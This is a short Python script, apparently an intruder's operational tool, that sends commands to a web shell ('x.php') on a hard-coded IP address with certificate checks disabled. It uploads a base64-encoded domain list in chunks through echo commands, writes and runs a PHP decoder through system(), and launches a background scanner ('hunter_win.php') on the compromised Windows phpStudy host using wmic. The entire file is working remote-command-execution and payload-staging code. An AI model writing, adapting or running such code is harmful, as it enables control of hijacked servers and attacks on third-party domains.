#!/usr/bin/env python3
"""81.70分块传域名池"""
import urllib.request, ssl, base64, urllib.parse, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
W = "http://81.70.245.25/x.php"

def exec_cmd(cmd, timeout=30):
    try:
        data = urllib.parse.urlencode({"x": cmd}).encode()
        r = urllib.request.urlopen(urllib.request.Request(W, data=data), timeout=timeout, context=ctx)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:40]}"

b64 = base64.b64encode(open("/tmp/win_domains.txt","rb").read()).decode()
print(f"b64={len(b64)}")

# 分块600字符
CHUNK = 600
parts = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]
print(f"分{len(parts)}块")

# 初始化
exec_cmd("echo -n > C:/phpScan/db64.txt")
time.sleep(1)

ok = 0
for i, p in enumerate(parts):
    r = exec_cmd(f"echo -n {p} >> C:/phpScan/db64.txt", timeout=15)
    if "ERR" in r:
        print(f"块{i}失败: {r}", flush=True)
        break
    ok += 1
    if i % 20 == 0:
        print(f"[{i}/{len(parts)}]", flush=True)
    time.sleep(0.2)

print(f"完成{ok}块")

# 用PHP解码
dec = '<?php $d=file_get_contents("C:/phpScan/db64.txt");$o=base64_decode($d);file_put_contents("C:/phpScan/domains.txt",$o);echo "DONE:".strlen($o);?>'
dec_b64 = base64.b64encode(dec.encode()).decode()
exec_cmd(f'file_put_contents("C:/phpScan/d.php", base64_decode("{dec_b64}"));')
r = exec_cmd('system("C:/phpStudy/php/php-5.4.45/php.exe C:/phpScan/d.php");', timeout=40)
print(f"解码: {r[-30:]}", flush=True)

# 启动
r = exec_cmd('system("wmic process call create \\"C:/phpStudy/php/php-5.4.45/php.exe C:/phpScan/hunter_win.php\\"");', timeout=30)
import re
pid = re.findall(r"ProcessId = (\d+)", r)
print(f"启动: PID={pid[0] if pid else '?'}", flush=True)
